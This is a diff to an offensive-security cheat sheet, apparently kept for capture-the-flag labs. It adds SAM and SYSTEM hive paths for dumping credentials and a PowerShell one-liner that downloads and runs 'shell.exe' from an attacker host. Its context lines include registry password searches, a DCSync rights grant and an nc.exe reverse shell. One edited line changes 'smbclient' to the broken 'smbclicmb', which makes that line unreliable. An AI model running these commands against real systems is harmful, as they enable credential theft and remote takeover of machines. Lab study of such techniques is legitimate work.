@@ -130,6 +130,8 @@
   - REG QUERY HKLM /F "password" /t REG_SZ /S /d
   - REG QUERY HKCU /F "password" /t REG_SZ /S /d
   - REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64
+  - SAM:%SystemRoot%\System32\config\SAM
+  - System:%SystemRoot%\System32\config\system
 
 ### Active Directory
 [Cheatsheet](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse)
@@ -214,7 +216,7 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
 - smbclient //friendzone.htb/general -U "" = see files inside'
 - smbclient -N -L //$target/ = List Shares as Null User
   - -N = no password
-- smbclient -U 'administrator%Password@1' \\\\\$target\\C$
+- smbclicmb -U 'administrator%Password@1' \\\\\$target\\C$
 - Nmap scripts
   - smb-enum-users.nse
   - smb-os-discovery
@@ -344,6 +346,7 @@ png,jpg,config,html,asp,aspx,php,php5,xml,htm,exe
 - iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/Invoke-Powershell.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
   - Append Command End of script
   - Invoke-Name_Script -Reverse -IP 123 -Port 123
+- iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/shell.exe'); shell.exe 
 - **SMB**
   - Attacker
     - impacket-smbserver share $(pwd) -smb2support
